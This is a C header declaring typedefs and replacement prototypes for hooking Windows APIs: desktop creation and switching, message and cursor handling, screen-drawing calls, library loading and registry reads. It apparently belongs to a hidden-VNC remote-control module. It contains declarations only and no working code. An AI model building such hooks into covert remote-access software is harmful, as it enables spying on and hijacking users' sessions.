#ifndef __VNCHOOK_H_
#define __VNCHOOK_H_

typedef enum _HARDERROR_RESPONSE_OPTION {

	OptionAbortRetryIgnore, 
	OptionOk, 
	OptionOkCancel, 
	OptionRetryCancel, 
	OptionYesNo, 
	OptionYesNoCancel, 
	OptionShutdownSystem

} HARDERROR_RESPONSE_OPTION, *PHARDERROR_RESPONSE_OPTION;

typedef enum _HARDERROR_RESPONSE {

	ResponseReturnToCaller, 
	ResponseNotHandled, 
	ResponseAbort, 
	ResponseCancel, 
	ResponseIgnore, 
	ResponseNo, 
	ResponseOk, 
	ResponseRetry, 
	ResponseYes

} HARDERROR_RESPONSE, *PHARDERROR_RESPONSE;

//////////////////////////////////////////////////////////////////////////
// HOOK TYPES
typedef LRESULT (WINAPI *ptr_DefWindowProcW)(HWND hWnd,UINT uMsg,WPARAM wParam,LPARAM lParam);
typedef LRESULT (WINAPI *ptr_DefWindowProcA)(HWND hWnd,UINT uMsg,WPARAM wParam,LPARAM lParam);
typedef LRESULT (WINAPI *ptr_DefDlgProcW)(HWND hWnd,UINT uMsg,WPARAM wParam,LPARAM lParam);
typedef LRESULT (WINAPI *ptr_DefDlgProcA)(HWND hWnd,UINT uMsg,WPARAM wParam,LPARAM lParam);
typedef LRESULT (WINAPI *ptr_DefFrameProcW)(HWND hFrame,HWND hClient,UINT uMsg,WPARAM wParam,LPARAM lParam);
typedef LRESULT (WINAPI *ptr_DefFrameProcA)(HWND hFrame,HWND hClient,UINT uMsg,WPARAM wParam,LPARAM lParam);
typedef LRESULT (WINAPI *ptr_DefMDIChildProcW)(HWND hWnd,UINT uMsg,WPARAM wParam,LPARAM lParam);
typedef LRESULT (WINAPI *ptr_DefMDIChildProcA)(HWND hWnd,UINT uMsg,WPARAM wParam,LPARAM lParam);
typedef LRESULT (WINAPI *ptr_CallWindowProcW)(WNDPROC lpPrevWndFunc,HWND hWnd,UINT uMsg,WPARAM wParam,LPARAM lParam);
typedef LRESULT (WINAPI *ptr_CallWindowProcA)(WNDPROC lpPrevWndFunc,HWND hWnd,UINT uMsg,WPARAM wParam,LPARAM lParam);

typedef BOOL (WINAPI *ptr_GetCursorPos)(LPPOINT lpPoint);
typedef BOOL (WINAPI *ptr_SetCursorPos)(int X,int Y);
typedef DWORD (WINAPI *ptr_GetMessagePos)(VOID);
typedef HWND (WINAPI *ptr_SetCapture)(HWND hWnd);
typedef BOOL (WINAPI *ptr_ReleaseCapture)(VOID);
typedef HWND (WINAPI *ptr_GetCapture)(void);
typedef BOOL (WINAPI *ptr_GetMessageW)(LPMSG Msg,HWND hWnd,UINT uMsgFilterMin,UINT uMsgFilterMax);
typedef BOOL (WINAPI *ptr_GetMessageA)(LPMSG Msg,HWND hWnd,UINT uMsgFilterMin,UINT uMsgFilterMax);
typedef BOOL (WINAPI *ptr_PeekMessageW)(LPMSG Msg,HWND hWnd,UINT uMsgFilterMin,UINT uMsgFilterMax,UINT uRemoveMsg);
typedef BOOL (WINAPI *ptr_PeekMessageA)(LPMSG Msg,HWND hWnd,UINT uMsgFilterMin,UINT uMsgFilterMax,UINT uRemoveMsg);
typedef BOOL (WINAPI *ptr_TranslateMessage)(LPMSG Msg);

typedef HDESK (WINAPI *ptr_OpenInputDesktop)(DWORD dwFlags,BOOL bInherit,ACCESS_MASK dwDesiredAccess);
typedef BOOL (WINAPI *ptr_SwitchDesktop)(HDESK hDesk);

typedef HDESK (WINAPI *ptr_CreateDesktopA)(LPSTR lpszDesktop,LPSTR lpszDevice,LPDEVMODE pDevmode,DWORD dwFlags,ACCESS_MASK dwDesiredAccess,LPSECURITY_ATTRIBUTES lpsa);
typedef HDESK (WINAPI *ptr_CreateDesktopW)(LPWSTR lpszDesktop,LPWSTR lpszDevice,LPDEVMODE pDevmode,DWORD dwFlags,ACCESS_MASK dwDesiredAccess,LPSECURITY_ATTRIBUTES lpsa);

typedef HDESK (WINAPI *ptr_CreateDesktopExA)(LPSTR lpszDesktop,LPSTR lpszDevice,LPDEVMODE pDevmode,DWORD dwFlags,ACCESS_MASK dwDesiredAccess,LPSECURITY_ATTRIBUTES lpsa,ULONG ulHeapSize,PVOID pvoid);
typedef HDESK (WINAPI *ptr_CreateDesktopExW)(LPWSTR lpszDesktop,LPWSTR lpszDevice,LPDEVMODE pDevmode,DWORD dwFlags,ACCESS_MASK dwDesiredAccess,LPSECURITY_ATTRIBUTES lpsa,ULONG ulHeapSize,PVOID pvoid);

typedef HDESK (WINAPI *ptr_OpenDesktopA)(LPSTR lpszDesktop,DWORD dwFlags,BOOL bInherit,ACCESS_MASK dwDesiredAccess);
typedef HDESK (WINAPI *ptr_OpenDesktopW)(LPWSTR lpszDesktop,DWORD dwFlags,BOOL bInherit,ACCESS_MASK dwDesiredAccess);
typedef BOOL  (WINAPI *ptr_SetThreadDesktop)(IN HDESK hDesktop );

typedef BOOL  (WINAPI *ptr_GetUserObjectInformationA)(HANDLE hObj, int nIndex, PVOID pvInfo, DWORD nLength, LPDWORD lpnLengthNeeded );
typedef BOOL  (WINAPI *ptr_GetUserObjectInformationW)(HANDLE hObj, int nIndex, PVOID pvInfo, DWORD nLength, LPDWORD lpnLengthNeeded );

typedef BOOL (WINAPI *ptr_FlashWindowEx)(PFLASHWINFO pfwi);
typedef BOOL (WINAPI *ptr_FlashWindow)(HWND hWnd,BOOL bInvert);

typedef BOOL (WINAPI *ptr_TrackPopupMenuEx)(HMENU hmenu,UINT fuFlags,int x,int y,HWND hwnd,LPTPMPARAMS lptpm);
typedef BOOL (WINAPI *ptr_ShowWindow)(HWND hWnd,int nCmdShow);

typedef UINT (WINAPI *ptr_GetCaretBlinkTime)();

typedef int (WINAPI *ptr_SetDIBitsToDevice)(
		HDC hdc,
		int xDest,int yDest,
		DWORD w,DWORD h,
		int xSrc,int ySrc,
		UINT StartScan,
		UINT cLines,
		CONST VOID *lpvBits,
		CONST BITMAPINFO *lpbmi,
		UINT ColorUse
		);
typedef BOOL (WINAPI *ptr_BitBlt)( HDC hdc, int x, int y, int cx, int cy, HDC hdcSrc, int x1, int y1, DWORD rop);

typedef HMODULE (WINAPI *ptr_LoadLibraryA)(LPCSTR lpFileName);
typedef HMODULE (WINAPI *ptr_LoadLibraryW)(LPCWSTR lpFileName);
typedef HMODULE (WINAPI *ptr_LoadLibraryExA)( LPCSTR lpFileName, HANDLE hFile, DWORD dwFlags );
typedef HMODULE (WINAPI *ptr_LoadLibraryExW)( LPCWSTR lpFileName, HANDLE hFile, DWORD dwFlags );
typedef FARPROC (WINAPI *ptr_GetProcAddress)( HMODULE hModule, LPCSTR lpProcName );

typedef LONG (WINAPI *ptr_RegQueryValueExW)(
	IN HKEY hKey,
	IN LPCWSTR lpValueName,
	IN LPDWORD lpReserved,
	OUT LPDWORD lpType,
	OUT LPBYTE lpData,
	OUT LPDWORD lpcbData
	);

typedef LONG (WINAPI *ptr_RegGetValueW)(
		HKEY    hkey,
		LPCWSTR  lpSubKey,
		LPCWSTR  lpValue,
		DWORD    dwFlags,
		LPDWORD pdwType,
		PVOID   pvData,
		LPDWORD pcbData 
		);

typedef LONG (WINAPI *ptr_NtRaiseHardError)(
		IN LONG ErrorStatus, 
		IN ULONG NumberOfParameters, 
		IN PVOID UnicodeStringParameterMask OPTIONAL, 
		IN PVOID *Parameters, 
		IN HARDERROR_RESPONSE_OPTION ResponseOption, 
		OUT PHARDERROR_RESPONSE Response 
		);

typedef LONG (WINAPI *ptr_NtConnectPort) (
    OUT PHANDLE PortHandle,
    IN PUNICODE_STRING PortName,
    IN PVOID SecurityQos,
    IN OUT PVOID ClientView OPTIONAL,
    IN OUT PVOID ServerView OPTIONAL,
    OUT PULONG MaxMessageLength OPTIONAL,
    IN OUT PVOID ConnectionInformation OPTIONAL,
    IN OUT PULONG ConnectionInformationLength OPTIONAL
    );

typedef BOOL (WINAPI *ptr_SetShellWindow)(HWND hwnd);
typedef BOOL (WINAPI *ptr_SetShellWindowEx)(HWND hwnd, HWND);
typedef HWND (WINAPI *ptr_GetShellWindow)( VOID );

typedef BOOL (WINAPI *ptr_SetTaskmanWindow)(HWND hwnd);
typedef HWND (WINAPI *ptr_GetTaskmanWindow)( VOID );
typedef BOOL (WINAPI *ptr_SetProgmanWindow)(HWND hwnd);
typedef HWND (WINAPI *ptr_GetProgmanWindow)( VOID );

typedef BOOL (WINAPI *ptr_SystemParametersInfoW)(UINT uiAction,UINT uiParam,PVOID pvParam,UINT fWinIni);
typedef BOOL (WINAPI *ptr_SystemParametersInfoA)(UINT uiAction,UINT uiParam,PVOID pvParam,UINT fWinIni);


//shell32
typedef DWORD (__stdcall *ptr_SHRestricted)(IN LONG rest);
typedef void (__stdcall *ptr_SHGetSetSettings)( PVOID ptr, DWORD dwMask, BOOL bSet );

typedef void (__stdcall *ptr_SetThemeAppProperties)(DWORD dwFlags);

//////////////////////////////////////////////////////////////////////////
// FORWARD DECLARATIONS

INT SetU32Hooks(VOID);

LRESULT WINAPI my_DefWindowProcW(HWND hWnd,UINT uMsg,WPARAM wParam,LPARAM lParam);
LRESULT WINAPI my_DefWindowProcA(HWND hWnd,UINT uMsg,WPARAM wParam,LPARAM lParam);
LRESULT WINAPI my_DefDlgProcW(HWND hWnd,UINT uMsg,WPARAM wParam,LPARAM lParam);
LRESULT WINAPI my_DefDlgProcA(HWND hWnd,UINT uMsg,WPARAM wParam,LPARAM lParam);
LRESULT WINAPI my_DefFrameProcW(HWND hFrame,HWND hClient,UINT uMsg,WPARAM wParam,LPARAM lParam);
LRESULT WINAPI my_DefFrameProcA(HWND hFrame,HWND hClient,UINT uMsg,WPARAM wParam,LPARAM lParam);
LRESULT WINAPI my_DefMDIChildProcW(HWND hWnd,UINT uMsg,WPARAM wParam,LPARAM lParam);
LRESULT WINAPI my_DefMDIChildProcA(HWND hWnd,UINT uMsg,WPARAM wParam,LPARAM lParam);
LRESULT WINAPI my_CallWindowProcW(WNDPROC lpPrevWndFunc,HWND hWnd,UINT uMsg,WPARAM wParam,LPARAM lParam);
LRESULT WINAPI my_CallWindowProcA(WNDPROC lpPrevWndFunc,HWND hWnd,UINT uMsg,WPARAM wParam,LPARAM lParam);

BOOL WINAPI my_GetCursorPos(LPPOINT lpPoint);
BOOL WINAPI my_SetCursorPos(int X,int Y);
DWORD WINAPI my_GetMessagePos(VOID);
HWND WINAPI my_SetCapture(HWND hWnd);
BOOL WINAPI my_ReleaseCapture(VOID);
HWND WINAPI my_GetCapture(void);
BOOL WINAPI my_GetMessageW(LPMSG Msg,HWND hWnd,UINT uMsgFilterMin,UINT uMsgFilterMax);
BOOL WINAPI my_GetMessageA(LPMSG Msg,HWND hWnd,UINT uMsgFilterMin,UINT uMsgFilterMax);
BOOL WINAPI my_PeekMessageW(LPMSG Msg,HWND hWnd,UINT uMsgFilterMin,UINT uMsgFilterMax,UINT uRemoveMsg);
BOOL WINAPI my_PeekMessageA(LPMSG Msg,HWND hWnd,UINT uMsgFilterMin,UINT uMsgFilterMax,UINT uRemoveMsg);
BOOL WINAPI my_TranslateMessage(LPMSG Msg);

HDESK WINAPI my_CreateDesktopA(LPSTR lpszDesktop,LPSTR lpszDevice,LPDEVMODE pDevmode,DWORD dwFlags,ACCESS_MASK dwDesiredAccess,LPSECURITY_ATTRIBUTES lpsa);
HDESK WINAPI my_CreateDesktopW(LPWSTR lpszDesktop,LPWSTR lpszDevice,LPDEVMODE pDevmode,DWORD dwFlags,ACCESS_MASK dwDesiredAccess,LPSECURITY_ATTRIBUTES lpsa);

HDESK WINAPI my_CreateDesktopExA(LPSTR lpszDesktop,LPSTR lpszDevice,LPDEVMODE pDevmode,DWORD dwFlags,ACCESS_MASK dwDesiredAccess,LPSECURITY_ATTRIBUTES lpsa,ULONG ulHeapSize,PVOID pvoid);
HDESK WINAPI my_CreateDesktopExW(LPWSTR lpszDesktop,LPWSTR lpszDevice,LPDEVMODE pDevmode,DWORD dwFlags,ACCESS_MASK dwDesiredAccess,LPSECURITY_ATTRIBUTES lpsa,ULONG ulHeapSize,PVOID pvoid);

HDESK WINAPI my_OpenDesktopA(LPSTR lpszDesktop,DWORD dwFlags,BOOL bInherit,ACCESS_MASK dwDesiredAccess);
HDESK WINAPI my_OpenDesktopW(LPWSTR lpszDesktop,DWORD dwFlags,BOOL bInherit,ACCESS_MASK dwDesiredAccess);

HDESK WINAPI my_OpenInputDesktop(DWORD dwFlags,BOOL bInherit,ACCESS_MASK dwDesiredAccess);
BOOL WINAPI my_SwitchDesktop(HDESK hDesk);
BOOL WINAPI my_SetThreadDesktop(IN HDESK hDesktop );

BOOL
WINAPI
	my_GetUserObjectInformationA(
		HANDLE hObj,
		int nIndex,
		PVOID pvInfo,
		DWORD nLength,
		LPDWORD lpnLengthNeeded
		);

BOOL
WINAPI
	my_GetUserObjectInformationW(
		HANDLE hObj,
		int nIndex,
		PVOID pvInfo,
		DWORD nLength,
		LPDWORD lpnLengthNeeded
		);

BOOL WINAPI my_FlashWindowEx(PFLASHWINFO pfwi);
BOOL WINAPI my_FlashWindow(HWND hWnd,BOOL bInvert);

UINT WINAPI my_GetCaretBlinkTime(VOID);

int WINAPI 
	my_SetDIBitsToDevice(
		HDC hdc,
		int xDest,int yDest,
		DWORD w,DWORD h,
		int xSrc,int ySrc,
		UINT StartScan,
		UINT cLines,
		CONST VOID *lpvBits,
		CONST BITMAPINFO *lpbmi,
		UINT ColorUse
		);
BOOL WINAPI my_BitBlt( HDC hdc, int x, int y, int cx, int cy, HDC hdcSrc, int x1, int y1, DWORD rop);

BOOL WINAPI my_TrackPopupMenuEx(HMENU hmenu,UINT fuFlags,int x,int y,HWND hwnd,LPTPMPARAMS lptpm);

HMODULE WINAPI my_LoadLibraryA(LPCSTR lpFileName);
HMODULE WINAPI my_LoadLibraryW(LPCWSTR lpFileName);
HMODULE WINAPI my_LoadLibraryExA(
	LPCSTR lpFileName,
	HANDLE hFile,
	DWORD dwFlags
	);
HMODULE WINAPI my_LoadLibraryExW(
	LPCWSTR lpFileName,
	HANDLE hFile,
	DWORD dwFlags
	);
FARPROC WINAPI my_GetProcAddress( HMODULE hModule, LPCSTR lpProcName );

LONG WINAPI my_RegQueryValueExW(
	IN HKEY hKey,
	IN LPCWSTR lpValueName,
	IN LPDWORD lpReserved,
	IN LPDWORD lpType,
	IN LPBYTE lpData,
	IN LPDWORD lpcbData
	);
LONG WINAPI my_RegGetValueW(
		HKEY    hkey,
		LPCWSTR  lpSubKey,
		LPCWSTR  lpValue,
		DWORD    dwFlags,
		LPDWORD pdwType,
		PVOID   pvData,
		LPDWORD pcbData 
		);

LONG WINAPI my_NtRaiseHardError(
		IN LONG ErrorStatus, 
		IN ULONG NumberOfParameters, 
		IN PVOID UnicodeStringParameterMask OPTIONAL, 
		IN PVOID *Parameters, 
		IN HARDERROR_RESPONSE_OPTION ResponseOption, 
		OUT PHARDERROR_RESPONSE Response 
		);

LONG WINAPI my_NtConnectPort (
    OUT PHANDLE PortHandle,
    IN PUNICODE_STRING PortName,
    IN PVOID SecurityQos,
    IN OUT PVOID ClientView OPTIONAL,
    IN OUT PVOID ServerView OPTIONAL,
    OUT PULONG MaxMessageLength OPTIONAL,
    IN OUT PVOID ConnectionInformation OPTIONAL,
    IN OUT PULONG ConnectionInformationLength OPTIONAL
    );

BOOL WINAPI my_SetShellWindow(HWND hwnd);
BOOL WINAPI my_SetShellWindowEx(HWND hwnd, HWND hwnd1);
HWND WINAPI my_GetShellWindow ( VOID );

BOOL WINAPI my_SetTaskmanWindow(HWND hwnd);
HWND WINAPI my_GetTaskmanWindow( VOID );
BOOL WINAPI my_SetProgmanWindow(HWND hwnd);
HWND WINAPI my_GetProgmanWindow( VOID );

BOOL WINAPI my_SystemParametersInfoW(UINT uiAction,UINT uiParam,PVOID pvParam,UINT fWinIni);
BOOL WINAPI my_SystemParametersInfoA(UINT uiAction,UINT uiParam,PVOID pvParam,UINT fWinIni);


//shell32
DWORD __stdcall my_SHRestricted(IN LONG rest);
void __stdcall my_SHGetSetSettings( PVOID ptr, DWORD dwMask, BOOL bSet );

void __stdcall my_SetThemeAppProperties(DWORD dwFlags);

#endif // __VNCHOOK_H_
